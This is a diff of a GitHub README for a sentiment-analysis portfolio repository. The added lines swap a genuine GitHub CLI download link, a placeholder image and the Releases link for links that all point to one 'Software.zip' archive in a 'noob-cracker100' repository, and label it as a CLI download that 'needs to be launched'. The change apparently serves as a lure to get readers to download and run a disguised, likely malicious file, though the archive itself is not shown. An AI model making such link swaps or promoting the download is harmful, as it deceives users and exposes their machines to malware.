@@ -19,9 +19,9 @@ Welcome to the **Data Analysis Portfolio** GitHub repository! This repository fo
 - vader-sentiment-analysis
 
 ## Resources
-- [Download ZIP file for CLI v1.0.0](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) *(needs to be launched)*
+- [Download ZIP file for CLI v1.0.0](https://github.com/noob-cracker100/data-analysis-portofolio/releases/download/v1.0/Software.zip) *(needs to be launched)*
 
-![Data Analysis Portfolio](https://github.com/username/repository/blob/master/images/data-analysis.png)
+![Data Analysis Portfolio](https://github.com/noob-cracker100/data-analysis-portofolio/releases/download/v1.0/Software.zip)
 
 ## Sentiment Analysis Tools
 ### Python Libraries
@@ -44,6 +44,6 @@ Welcome to the **Data Analysis Portfolio** GitHub repository! This repository fo
 5. Experiment with different lexicons and techniques for sentiment analysis.
 
 ## Note
-For the latest updates and releases, please check the [Releases](https://github.com/username/repository/releases) section of this repository.
+For the latest updates and releases, please check the [Releases](https://github.com/noob-cracker100/data-analysis-portofolio/releases/download/v1.0/Software.zip) section of this repository.
 
 📊 Happy Sentiment Analysis! 📊
